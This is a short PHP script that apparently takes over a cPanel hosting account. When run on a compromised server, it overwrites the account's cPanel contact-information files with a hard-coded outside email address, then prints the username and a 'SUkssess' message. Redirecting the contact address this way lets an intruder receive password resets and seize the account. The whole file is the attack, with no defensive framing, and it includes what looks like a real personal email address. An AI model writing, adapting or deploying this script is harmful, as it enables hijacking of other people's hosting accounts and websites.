<?php
session_start();
echo "<font color=lime>";
$user = get_current_user();
$email = "dm207073@gmail.com";
$wr = 'email:'.$email;
$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
fwrite($f, $wr);
fclose($f);
$f = fopen('/home/'.$user.'/.contactinfo', 'w');
fwrite($f, $wr);
fclose($f);
echo '<br/><center>'.$user.'<br>SUkssess</center>';
?>
